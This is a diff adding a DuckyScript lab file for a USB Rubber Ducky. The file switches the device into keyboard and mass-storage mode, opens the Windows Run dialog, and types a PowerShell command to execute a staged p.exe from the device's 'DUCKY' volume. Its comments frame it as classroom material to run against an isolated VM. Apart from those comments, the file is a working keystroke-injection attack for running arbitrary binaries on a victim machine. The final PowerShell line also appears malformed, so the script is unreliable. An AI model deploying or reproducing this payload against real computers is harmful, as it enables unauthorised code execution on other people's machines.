@@ -1,0 +1,25 @@
+REM ============================================================
+REM Lab 03: Staged Payload from Onboard USB Storage
+REM Target: Windows 10/11, USB Rubber Ducky (DuckyScript 3.0)
+REM Requires: firmware/hardware with dual HID+STORAGE attack mode
+REM ("Twin Duck") - not all Ducky units support ATTACKMODE STORAGE.
+REM
+REM WARNING: Run only against an isolated, snapshotted VM.
+REM
+REM Prerequisite: copy your staged executable to the root of the
+REM Ducky's onboard storage partition as p.exe, and confirm that
+REM partition's volume label is "DUCKY" (check/set in the Ducky's
+REM storage settings before class - don't rely on the default).
+REM
+REM Effect: switches the device into combined HID keyboard + mass
+REM storage mode, waits for Windows to mount the storage partition,
+REM finds whatever drive letter Windows assigned to the "DUCKY"
+REM volume (varies per machine), and executes p.exe from it.
+REM ============================================================
+
+ATTACKMODE HID STORAGE
+DELAY 3000
+GUI r
+DELAY 100
+STRING powershell "$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter;$m':\p.exe'"
+ENTER
